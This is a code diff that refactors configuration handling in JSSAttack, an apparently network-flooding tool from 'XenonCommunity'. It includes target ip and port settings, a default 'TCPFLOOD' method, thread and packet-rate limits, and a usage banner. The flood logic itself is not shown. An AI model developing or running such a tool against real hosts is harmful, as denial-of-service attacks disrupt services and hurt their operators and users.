@@ -7,6 +7,7 @@ import ir.xenoncommunity.jss.utils.filemanager.Value;
 import lombok.Getter;
 import lombok.RequiredArgsConstructor;
 import lombok.SneakyThrows;
+import lombok.val;
 import org.jetbrains.annotations.NotNull;
 
 import java.net.InetAddress;
@@ -44,6 +45,7 @@ public class JSSAttack implements Runnable {
      */
     @SneakyThrows
     public void run() {
+        // Create local variables for our configuration/run args
         boolean debug = false;
         String ip = null;
         Integer port;
@@ -53,19 +55,24 @@ public class JSSAttack implements Runnable {
         Integer duration;
         String method = null;
         Boolean verbose = null;
-        FileManager.values.add(new Value("ip", "0.0.0.0"));
-        FileManager.values.add(new Value("port", 1024));
-        FileManager.values.add(new Value("ppsLimit", 1000));
-        FileManager.values.add(new Value("maxThreads", 5));
-        FileManager.values.add(new Value("byteSize", 1024));
-        FileManager.values.add(new Value("method", "TCPFLOOD"));
-        FileManager.values.add(new Value("verbose", false));
-        FileManager.values.add(new Value("duration", -1));
+        // Check if user is using config
         if (this.parser.get("--config", String.class, null) != null){
+            // to solve the error, there is no purpose
             duration = null;
             port = null;
+            // Add values to FileManager
+            FileManager.values.add(new Value<>("ip", "0.0.0.0"));
+            FileManager.values.add(new Value<>("port", 1024));
+            FileManager.values.add(new Value<>("ppsLimit", 1000));
+            FileManager.values.add(new Value<>("maxThreads", 5));
+            FileManager.values.add(new Value<>("byteSize", 1024));
+            FileManager.values.add(new Value<>("method", "TCPFLOOD"));
+            FileManager.values.add(new Value<>("verbose", false));
+            FileManager.values.add(new Value<>("duration", -1));
+            // Init the FileManager
             FileManager.init();
-            for(Value val : FileManager.values){
+            // Switch between configuration items and set the values
+            for(val val : FileManager.values){
                 switch(val.getName()){
                     case "ip":{
                         ip = (String) val.getValue();
@@ -102,9 +109,9 @@ public class JSSAttack implements Runnable {
 
                 }
             }
-
+        // See If user isn't using configuration and using run args instead
         } else {
-            //Clears the entire FileManager values because we don't need them.
+            // Clears the entire FileManager values because we don't need them
             FileManager.values.clear();
             // Parse command line arguments
             debug = this.parser.get("--debug", Boolean.class, false);
@@ -118,6 +125,7 @@ public class JSSAttack implements Runnable {
             verbose = this.parser.get("--verbose", Boolean.class, false);
 
         }
+        // Check if values are null
         if (ip == null) {
             System.out.println("JSSAttack by XenonCommunity");
             System.out.println("Usage: java -jar JSSAttack.jar --ip <ip> --port <port> --threads <threads> --byteSize <byteSize> --duration <duration> --method <method> [--verbose] [--debug]");
@@ -125,9 +133,9 @@ public class JSSAttack implements Runnable {
         }
 
         // Set logging level based on verbosity and debug mode
-        if (verbose) {
+        if (verbose != null && verbose) {
             Logger.setCurrentLevel(Logger.LEVEL.VERBOSE);
-        } else if (debug) {
+        } else if (debug){
             Logger.setCurrentLevel(Logger.LEVEL.DEBUG);
         }
 
@@ -139,12 +147,13 @@ public class JSSAttack implements Runnable {
         Logger.log(Logger.LEVEL.DEBUG, "ByteSize is: " + byteSize);
         Logger.log(Logger.LEVEL.DEBUG, "Duration is: " + duration);
         Logger.log(Logger.LEVEL.DEBUG, "Method is: " + method);
-
+        assert maxThreads != null;
         // Initialize task manager
         TaskManager taskManager = new TaskManager(maxThreads + 1);
 
         // Initialize attack parameters
         final AttackStatics attackStatics = new AttackStatics(ppsLimit);
+        assert method != null;
         final IAttackMethod attackMethod = getMethod(method, byteSize, attackStatics);
         final InetAddress addr = InetAddress.getByName(ip);
         Integer finalDuration = duration;
